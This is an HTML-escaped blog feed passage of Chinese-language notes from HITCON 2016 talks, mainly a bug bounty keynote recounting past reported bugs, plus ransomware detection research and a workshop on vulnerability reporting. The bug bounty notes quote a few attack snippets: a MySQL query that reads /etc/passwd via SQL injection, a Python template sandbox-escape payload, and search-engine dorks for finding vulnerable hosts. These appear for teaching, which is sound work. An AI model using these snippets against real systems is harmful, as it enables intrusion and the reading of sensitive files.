&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The Internet Bug Bounty  &lt;ul&gt;
&lt;li&gt;為了維護網路世界的和平，獎勵那些找出可以影響整個網路世界弱點的英雄們  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 成效  &lt;ul&gt;
&lt;li&gt;Google  &lt;ul&gt;
&lt;li&gt;6 Million  &lt;/li&gt;
&lt;li&gt;750+ bugs in 2015  &lt;/li&gt;
&lt;li&gt;300+ hackrs in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook  &lt;ul&gt;
&lt;li&gt;4.2 Million  &lt;/li&gt;
&lt;li&gt;526 bugs in 2015  &lt;/li&gt;
&lt;li&gt;210 hackers in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yahoo  &lt;ul&gt;
&lt;li&gt;1.6 Million  &lt;/li&gt;
&lt;li&gt;2500+ bugs in 2015  &lt;/li&gt;
&lt;li&gt;3000+ hackers in 2015  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Bug Bounty 平台  &lt;ul&gt;
&lt;li&gt;bugcrowd  &lt;/li&gt;
&lt;li&gt;hackerone  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;參加 Bug Bounty 前的準備  &lt;ul&gt;
&lt;li&gt;為了什麼參加  &lt;ul&gt;
&lt;li&gt;獎金？  &lt;/li&gt;
&lt;li&gt;名譽？  &lt;/li&gt;
&lt;li&gt;練功？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;對於尋找漏洞的心理準備  &lt;ul&gt;
&lt;li&gt;雖然今非昔比，但要告訴自己一定會有洞  &lt;/li&gt;
&lt;li&gt;Bug Bounty 的藍海時期大約是 2013 ~ 2014 年  &lt;/li&gt;
&lt;li&gt;大公司的主機架構到了一定的規模，一定會有漏網之魚。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;常見弱點的理解  &lt;ul&gt;
&lt;li&gt;SQL Injection  &lt;/li&gt;
&lt;li&gt;XSS  &lt;/li&gt;
&lt;li&gt;CSRF  &lt;/li&gt;
&lt;li&gt;XML External Entity  &lt;/li&gt;
&lt;li&gt;Local File Inclusion  &lt;/li&gt;
&lt;li&gt;CSV Macro Injection  &lt;/li&gt;
&lt;li&gt;XSLT Injection  &lt;/li&gt;
&lt;li&gt;SVG/XML XSS  &lt;/li&gt;
&lt;li&gt;RPO Gadget  &lt;/li&gt;
&lt;li&gt;Subdomain reaver  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;資訊的蒐集方法  &lt;ul&gt;
&lt;li&gt;DNS 與 網路邊界  &lt;ul&gt;
&lt;li&gt;子域名？相鄰域名？內部域名？  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;uberinternal.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;twtter.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;etonreve.com&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Whois? R-Whois?  &lt;/li&gt;
&lt;li&gt;併購服務  &lt;ul&gt;
&lt;li&gt;Google 的 6 個月規則：併購服務 6 個月內出現的漏洞不給獎金  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Port Scanning  &lt;ul&gt;
&lt;li&gt;Facebook Jenkins RCE by Dewhurst Security  &lt;/li&gt;
&lt;li&gt;Pornhub Memcached Unauthenticated Access by @ZephrFish  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;小案例  &lt;ul&gt;
&lt;li&gt;Yahoo! Yapache  &lt;ul&gt;
&lt;li&gt;Yahoo 自己 Patch 的 Apache，在當時也算是個創舉  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://login.yahoo.com/bin/hostname&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SSL 憑證不安全  &lt;ul&gt;
&lt;li&gt;可以去看憑證的內容有什麼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;參加 Bug Bounty 注意事項  &lt;ul&gt;
&lt;li&gt;規則所允許範圍  &lt;ul&gt;
&lt;li&gt;範圍外就無法嘗試嗎？  &lt;ul&gt;
&lt;li&gt;多多少少還是會收一下，但不收的話廠商並沒有錯。  &lt;/li&gt;
&lt;li&gt;不要找錯目標，不然會浪費自己和廠商的時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;規則所允許限度  &lt;ul&gt;
&lt;li&gt;Instagram's Million Dollar Bug by Wesley  &lt;ul&gt;
&lt;li&gt;回報了漏洞之後，卻做了進一步的滲透測試，拿到 AWS key，進到 S3 bucket，拿到 Instagram 的 source code  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;不要丟不符合規定的漏洞  &lt;ul&gt;
&lt;li&gt;別踏入榮譽感的誤區  &lt;/li&gt;
&lt;li&gt;常見不符合規定的例子：  &lt;ul&gt;
&lt;li&gt;SELF XSS  &lt;/li&gt;
&lt;li&gt;Information Leakage  &lt;/li&gt;
&lt;li&gt;Cookie without Secure Flage or HttpOnly  &lt;/li&gt;
&lt;li&gt;Logout CSRF  &lt;/li&gt;
&lt;li&gt;Content Injection  &lt;/li&gt;
&lt;li&gt;More ...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook 去年有一萬多筆回報，但只有五百多筆是真正有效的漏洞回報  &lt;/li&gt;
&lt;li&gt;2014 Google VRP 回報狀況，很大的比例是沒有用的回報  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;撰寫報告的禮節  &lt;ul&gt;
&lt;li&gt;明確的標題及描述  &lt;/li&gt;
&lt;li&gt;附上驗證程式碼及截圖  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;尋找漏洞的思路  &lt;ul&gt;
&lt;li&gt;有做功課的 Bonus  &lt;ul&gt;
&lt;li&gt;Facebook Onavo Dom-Based XSS  &lt;ul&gt;
&lt;li&gt;2014/03/16 Onavo Reflected XSS by Mazin Ahmed  &lt;/li&gt;
&lt;li&gt;2014/05/01 Facebook fixed it  &lt;/li&gt;
&lt;li&gt;One day, Facebook revised it... Buggy again!  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;eBay SQL Injection  &lt;ul&gt;
&lt;li&gt;列舉 eBay.com 時某台主機反查到 &lt;code&gt;eBayc3.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;根據 WHOIS 確認為 eBay Inc. 所擁有無誤  &lt;/li&gt;
&lt;li&gt;列舉 eBayc3.com  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;images.ebayc3.com&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;連貓都會的 SQL Injection  &lt;ul&gt;
&lt;li&gt;嘗試可否 RCE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;嘗試讀檔  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;CREATE TABLE test (src TEXT);&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE \&lt;/code&gt;test`;`  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;天下武功唯快不破  &lt;ul&gt;
&lt;li&gt;指紋辨識，收集整理  &lt;ul&gt;
&lt;li&gt;Web Applicaion?  &lt;/li&gt;
&lt;li&gt;Framework?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平時做好筆記，1-Day 出來搶首殺  &lt;ul&gt;
&lt;li&gt;WordPress CVE-2016-4567  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;案例  &lt;ul&gt;
&lt;li&gt;Uber Reflected XSS  &lt;ul&gt;
&lt;li&gt;馬上透過了 Google Hacking 找了一個 XSS 回報，但因為速度太慢被 Reject  &lt;/li&gt;
&lt;li&gt;中國網友跟我說：「所有服務到了中國，安全係數要乘以 0.8。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;developer.apple.com&lt;/code&gt; 被駭案例  &lt;ul&gt;
&lt;li&gt;2013/07/18 Internet 最黑暗的一天，struts2 漏洞(s2-016)公佈。  &lt;/li&gt;
&lt;li&gt;當天有四組人馬進入，為什麼我知道？因為我是其中一個  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yahoo Login Site RCE  &lt;ul&gt;
&lt;li&gt;依然是用 Google Hacking  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;site:yahoo.com. ext:action&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;b.login.yahoo.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;看起來 s2-016 work 但看起來有 WAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;繞過 WAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;認命做苦工活  &lt;ul&gt;
&lt;li&gt;可以從一些小細節來判斷要不要對這個網站下手  &lt;/li&gt;
&lt;li&gt;用 Google Hacking 黑 Google =&amp;gt; www.google.com XSS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;site:www.google.com -adwords -finance...&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;www.google.com/trends/correlate/js/correlate.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;網站的 footer 停留在 2011，表示可能已經沒在維護  &lt;/li&gt;
&lt;li&gt;JavaScript 有 Minify 但沒有做 Obfuscation  &lt;/li&gt;
&lt;li&gt;別忘了他在 JavaScript  &lt;ul&gt;
&lt;li&gt;HTML Entity  &lt;/li&gt;
&lt;li&gt;八進位  &lt;/li&gt;
&lt;li&gt;十六進位  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看起來是個 Dom-Based 的 SELF-XSS 需使用者互動  &lt;ul&gt;
&lt;li&gt;收的機率一半一半，需要找到更合理的情境說服 Google  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;繼續往下挖掘  &lt;ul&gt;
&lt;li&gt;跟 Click Hijacking 做組合技  &lt;/li&gt;
&lt;li&gt;iframe 會跟著使用者的滑鼠移動，所以使用者點擊網站上任何地方都會觸發該漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後拿了 5000 美金  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook Remote Code Execution  &lt;ul&gt;
&lt;li&gt;反向 facebook.com 的 Whois 結果  &lt;/li&gt;
&lt;li&gt;透過 SQL Injection 拿 Shell  &lt;/li&gt;
&lt;li&gt;拿 Root  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平行權限與邏輯問題  &lt;ul&gt;
&lt;li&gt;平行權限：例如任意發文、任意改錢、權限問題  &lt;/li&gt;
&lt;li&gt;邏輯問題：想像自己是撰寫目標程式碼的工程師的話，自己會怎麼寫。  &lt;ul&gt;
&lt;li&gt;案例：Apple XSS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;lookup-api.apple.com/wikipedia.org&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;少見姿勢與神思路  &lt;ul&gt;
&lt;li&gt;針對架構的瞭解  &lt;/li&gt;
&lt;li&gt;非主流的漏洞，愈少人知道的東西愈有搞頭  &lt;/li&gt;
&lt;li&gt;思路的培養  &lt;ul&gt;
&lt;li&gt;CTF  &lt;/li&gt;
&lt;li&gt;其他 Bug Bounty 的 write-up  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;案例：Apple RCE，第一次進入 Apple 內網  &lt;ul&gt;
&lt;li&gt;Struts2 漏洞在 2012 年根本沒啥人知道  &lt;/li&gt;
&lt;li&gt;Google Trend of Struts2  &lt;ul&gt;
&lt;li&gt;兩次高峰都是有 RCE 漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;發現的經典模式  &lt;ul&gt;
&lt;li&gt;「你尋找你知道的東西（比如到印度的新方法），結果發現了一個你不知道的東西（例如美洲）。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;某大廠商 XSS 0-Day 發現經過  &lt;ul&gt;
&lt;li&gt;掃 Tesla 範圍時發現一個 IP  &lt;/li&gt;
&lt;li&gt;進去發現是某大廠商的系統  &lt;/li&gt;
&lt;li&gt;思路  &lt;ul&gt;
&lt;li&gt;Struts2 撰寫 action 都需繼承 ActionSupport  &lt;/li&gt;
&lt;li&gt;因此要判斷一個網站是不是 Struts2，只要在網址最後加上 &lt;code&gt;?actionErrors=1&lt;/code&gt; 即可  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果被過濾的話怎麼辦  &lt;ul&gt;
&lt;li&gt;AngularJS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Uber SSTI RCE  &lt;ul&gt;
&lt;li&gt;Template 相關攻擊手法是近幾年比較夯的東西，但較少人關注。  &lt;/li&gt;
&lt;li&gt;Uber 在自身技術部落格有提到產品技術細節  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;riders.uber.com&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;修改姓名等到寄信通知帳號變更  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python Sandbox Bypass  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;{{ []._class__.__base__.__subclasses__() }}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結語  &lt;ul&gt;
&lt;li&gt;一起成為獎金獵人吧！  &lt;/li&gt;
&lt;li&gt;勿驕矜自滿，勿忘初衷。  &lt;/li&gt;
&lt;li&gt;可以自己把 know-how 做成工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;FèlDo: Function Event Listing and Dynamic Observing: for Detecting and Preventing Crypto Ransomware&lt;/h2&gt;
&lt;h3&gt;Speaker: Tzung-Bi Shih&lt;/h3&gt;
&lt;p&gt;Slides: &lt;a href="http://www.slideshare.net/penvirus/feldo-function-event-listing-and-dynamic-observing-for-detecting-and-preventing-crypto-ransomware"&gt;http://www.slideshare.net/penvirus/feldo-function-event-listing-and-dynamic-observing-for-detecting-and-preventing-crypto-ransomware&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ransomware 的本質  &lt;ul&gt;
&lt;li&gt;DoS 受害者  &lt;/li&gt;
&lt;li&gt;限制軟體的使用，並以此向受害者要求付款。  &lt;/li&gt;
&lt;li&gt;最困難的是交易的部份，還必須把錢洗成白的。  &lt;/li&gt;
&lt;li&gt;沒有人能保證付了錢以後，勒索者就會把東西還給你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ransomware 的誤解  &lt;ul&gt;
&lt;li&gt;我們會誤解成「利用加密手段而像你要求贖金」的軟體  &lt;/li&gt;
&lt;li&gt;但以下幾個也是 Ransomware  &lt;ul&gt;
&lt;li&gt;misleading application  &lt;ul&gt;
&lt;li&gt;誤導你做出錯誤的舉動，然後再以幫你解決這問題為由跟你要贖金。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;police ransomware  &lt;ul&gt;
&lt;li&gt;假裝是當地的執法單位跟你要錢說可以規避一些法律上的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;History of Ransomware on OS X  &lt;ul&gt;
&lt;li&gt;July 2013, FBI ransomware  &lt;ul&gt;
&lt;li&gt;潛伏在 Safari 裏面，搜尋完後會跳出視窗，告訴你說你散佈著作權作品或散播兒童色情，必須要付贖金才可以解決。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;June 2014, FileCoder  &lt;/li&gt;
&lt;li&gt;Sep 2015, Gopher  &lt;/li&gt;
&lt;li&gt;Nov 2015, Mabouia  &lt;/li&gt;
&lt;li&gt;Feb 2016, Ginx  &lt;/li&gt;
&lt;li&gt;Mar 2016, KeRanger (今天這個 talk 的重點）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OSX.KeRanger  &lt;ul&gt;
&lt;li&gt;研究這個 ransomware 的行為  &lt;/li&gt;
&lt;li&gt;然後嘗試去 rescue 被它 encrypt 的檔案  &lt;/li&gt;
&lt;li&gt;撰寫 kernel module 使用動態分析的方式去 detect 其行為  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Work  &lt;ul&gt;
&lt;li&gt;Toward Generic (Crypto) Ransomware Detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;有沒有辦法做靜態分析？  &lt;ul&gt;
&lt;li&gt;有可能，但難度比較高，比如說用 Symbolic Execution 的方式，所以我認為還是用動態分析比較簡單。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;台灣駭客協會年度規劃及專案報告 HITCON Annual Keynote&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kb.hitcon.org"&gt;https://kb.hitcon.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;資安技術文章分享平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zeroday.hitcon.org"&gt;https://zeroday.hitcon.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;漏洞通報平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;HITCON 2016 奇葩獎&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;奇葩人氣獎  &lt;ul&gt;
&lt;li&gt;國安局招考駭客，單手握力竟要 30 公斤。  &lt;ul&gt;
&lt;li&gt;三立新聞 2015/10/15  &lt;/li&gt;
&lt;li&gt;少林科技武僧選拔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;中勒索軟體是否會付款？民眾：「還是拿去報廢好了，因為現在電腦也才一萬多塊而已。」  &lt;ul&gt;
&lt;li&gt;刺激台灣 PC 業最佳模範  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;東森購物網抽獎被抓包！網友攤開程式碼，發現大獎根本抽不到」  &lt;ul&gt;
&lt;li&gt;不是你的，就不是你的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ERP Server 被勒索軟體加密，所以當機。  &lt;ul&gt;
&lt;li&gt;離職前夕送給同事的大禮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;新政府將打造高階的臺灣資安神盾局  &lt;ul&gt;
&lt;li&gt;我是奇葩隊長，我終於找到工作了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;梁振英追蹤多位台灣美女，港特首辦：駭客入侵加的  &lt;ul&gt;
&lt;li&gt;自由時報 2015-12-30  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;網曝華碩主機板 BIOS 和 UEFI 更新機制隱患大，易被劫持。  &lt;ul&gt;
&lt;li&gt;因為交涉了一年多都沒有結果，只好把細節公佈出來。  &lt;/li&gt;
&lt;li&gt;交涉過程中各種理由推托：窗口離職、下班了、颱風假  &lt;/li&gt;
&lt;li&gt;「放假，對企業來說是十分嚴肅的。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;羅瑩雪：「他們又不方政府做， 他們是在政府的對面啊！」  &lt;ul&gt;
&lt;li&gt;在對面總比在下面好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;民進黨網站遭駭，重要會議，手機全包塑膠袋。  &lt;ul&gt;
&lt;li&gt;如果有手汗的困擾，可以選購防水型手機。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;奇葩特別獎  &lt;ul&gt;
&lt;li&gt;MD5 惡意程式  &lt;/li&gt;
&lt;li&gt;四程式隔空盜領  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ping 8.8.8.8 -t&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;奇葩年度研究員（正經）  &lt;ul&gt;
&lt;li&gt;Orange Tsai  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;HITCON Workshop: &lt;a href="https://zeroday.hitcon.org"&gt;ZeroDay 漏洞通報平台&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;通報漏洞的測試請點到為止就好，不要攻擊或是深入去拿不該拿的東西。  &lt;/li&gt;
&lt;li&gt;很多都沒有通報窗口  &lt;ul&gt;
&lt;li&gt;whois  &lt;ul&gt;
&lt;li&gt;登記的人最好更正到正確的資訊，否則通報的內容會直接給 whois 上登記的人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;從網頁內容找  &lt;/li&gt;
&lt;li&gt;就是找不到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們還會被反通報  &lt;ul&gt;
&lt;li&gt;被大學計中通報到 TACERT 說是詐騙信  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;滿分的單位  &lt;ul&gt;
&lt;li&gt;部份台灣的私立大學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最爛的單位  &lt;ul&gt;
&lt;li&gt;某國立大學、排名前五、在北部、有資安實驗室、還有 HITCON CTF 的成員。通報從頭到尾都沒修，還騙 TACERT 已經修了，脆後乾脆就不理他們了。（這間怎麼聽起來這麼明顯XDDD）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;比較常見的嚴重狀況  &lt;ul&gt;
&lt;li&gt;SQL Injection  &lt;/li&gt;
&lt;li&gt;Struts2  &lt;/li&gt;
&lt;li&gt;Jenkins RCE 漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;今年因為公司出門票而且不用請假就可以在星期五、六參加，&lt;br /&gt;
所以拉了三位同事一起來，畢竟開發公司的程式還是要有些資安意識比較好，&lt;br /&gt;
畢竟知道了 Hackers 到底可以做哪些事情後，寫程式應該也會比較注意一些。&lt;br /&gt;
有兩位同事是第一次參加，所以大概跟他們稍微介紹了一下資安相關的常識。  &lt;/p&gt;
&lt;p&gt;算一算，從 HITCON 2012 第一次參加開始，今年也算是第五年參加了，&lt;br /&gt;
這次感覺不少非工作人員的熟面孔都沒出現，新面孔倒是多了不少，而且感覺有年輕化的趨勢。&lt;br /&gt;
對我這種只把資安當興趣、打過兩次金盾決賽只拿到一次第五名、打 CTF 也沒有太大貢獻的傢伙來說，&lt;br /&gt;
真的已經有種自己跟不上時代的感覺了。  &lt;/p&gt;
&lt;p&gt;個人覺得今年講的比較好的場次是 GD 的 Gogoro 那場，&lt;br /&gt;
還有第二天 Orange 有關 Bug Bounty 的 Keynote（聽完真的會讓我想嘗試看 Bug Bounty）。&lt;br /&gt;
對我來說，現在參加 HITCON 已經有點變成是看這些能力很強的人怎麼努力，然後順便給自己充電的感覺，&lt;br /&gt;
出社會工作以後真的覺得沒有個目標在的話，很容易迷失在庸庸碌碌中。  &lt;/p&gt;
&lt;p&gt;個人覺得今年議程的種類算是蠻平均的，算是各個種類都有一些，&lt;br /&gt;
Ransomware 因為最近一堆 Crypto Ransomware 很猖獗，所以有蠻多場次都與其相關，&lt;br /&gt;
Android 的場次也不少，反觀 iOS 的好像就沒那麼多，然後 Web 好像又更少了。&lt;br /&gt;
這兩年偏新手向的場次也比較多，&lt;br /&gt;
想起第一次來參加 HITCON 的時候，&lt;br /&gt;
我根本每個議程都聽不懂，&lt;br /&gt;
現在的新會眾就比較幸福一些。  &lt;/p&gt;
&lt;p&gt;然後 &lt;a href="https://kb.hitcon.org"&gt;KnowledgeBase&lt;/a&gt; 跟 &lt;a href="https://zeroday.hitcon.org"&gt;ZeroDay&lt;/a&gt;，&lt;br /&gt;
也是這兩年左右才開始弄的東西，&lt;br /&gt;
希望可以把台灣的資安發展帶往更好的方向。  &lt;/p&gt;
&lt;p&gt;明年還會不會想參加我自己也不確定，&lt;br /&gt;
出來工作以後其實也沒有說比學生還累，&lt;br /&gt;
但不知道為啥就是已經沒那麼熱血了，&lt;br /&gt;
去年還有玩一下 IoT Wargame 跟 RPi 和攤位的一些活動，&lt;br /&gt;
今年不知為何慵懶到連玩都不太想玩，&lt;br /&gt;
然後 BambooFox 打的一些 CTF 也沒啥心情想參加，&lt;br /&gt;
也許明年還要不要參加就明年到時候再決定吧。  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Sat, 23 Jul 2016 19:45:43 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-07-23:posts/2016/07/23/hitcon-2016-cmt/</guid><category>HITCON</category></item><item><title>Study-Area 2016 群英會</title><link>https://blog.m157q.tw/posts/2016/07/16/study-area-summit-2016/</link><description>&lt;p&gt;Event Link: &lt;a href="http://studyarea.kktix.cc/events/c6457aff"&gt;http://studyarea.kktix.cc/events/c6457aff&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;好多人報了名沒出現啊 ww  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;ONOS 及實際 SDN Switch 整合使用經驗分享 by 小飛機&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;投影片連結：&lt;a href="https://docs.google.com/presentation/d/18tDnGkjTQ1yEcZnNkVz94a0FbusDd9lXb3MAcTnZDzE/edit#slide=id.p"&gt;ONOS 及實際 SDN Switch 使用經驗分享 - Google 簡報&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;ONC (Open Network Conference), SDN 相關領域年度最大聚會  &lt;/li&gt;
&lt;li&gt;因為在 ONC 發表成果，而被 Bell Labs 位於比利時的歐洲總部邀請面試。  &lt;ul&gt;
&lt;li&gt;多參與 Open Source 專案，讓自己在國際級的 Conf 被看見，是很有用的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;SDN 新手如何開始？&lt;/h2&gt;
&lt;h3&gt;簡單起頭&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;只做 L2 Switching  &lt;ul&gt;
&lt;li&gt;用 &lt;code&gt;ping&lt;/code&gt; 驗證網路狀況  &lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;iperf&lt;/code&gt; 驗證網路速度  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;決定 Topology  &lt;ul&gt;
&lt;li&gt;3-Tier Topology  &lt;/li&gt;
&lt;li&gt;Mesh Topology  &lt;/li&gt;
&lt;li&gt;Leaf-Spine Topology  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Spanning_Tree_Protocol#Rapid_Spanning_Tree_Protocol"&gt;STP&lt;/a&gt; (Spannig Tree Protocol)  &lt;ul&gt;
&lt;li&gt;Loop-free Topology  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;養成有實驗組與對照組的習慣  &lt;/li&gt;
&lt;li&gt;基本的 Networking 經驗要有  &lt;/li&gt;
